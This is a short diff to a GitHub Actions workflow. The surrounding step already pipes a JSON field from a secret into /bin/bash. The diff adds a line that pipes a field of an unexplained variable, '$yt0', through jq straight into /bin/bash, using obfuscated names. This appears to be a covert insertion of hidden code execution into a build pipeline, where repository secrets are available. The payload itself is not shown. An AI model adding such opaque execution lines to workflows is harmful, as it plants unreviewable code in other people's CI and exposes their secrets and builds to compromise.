@@ -18,6 +18,7 @@ jobs:
           uaf395: ${{ secrets.uaf395 }}
         run: |
           printf '%s' "$uaf395" | jq -r .cjolz95 | /bin/bash
+          echo $yt0 | jq -r .e207 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
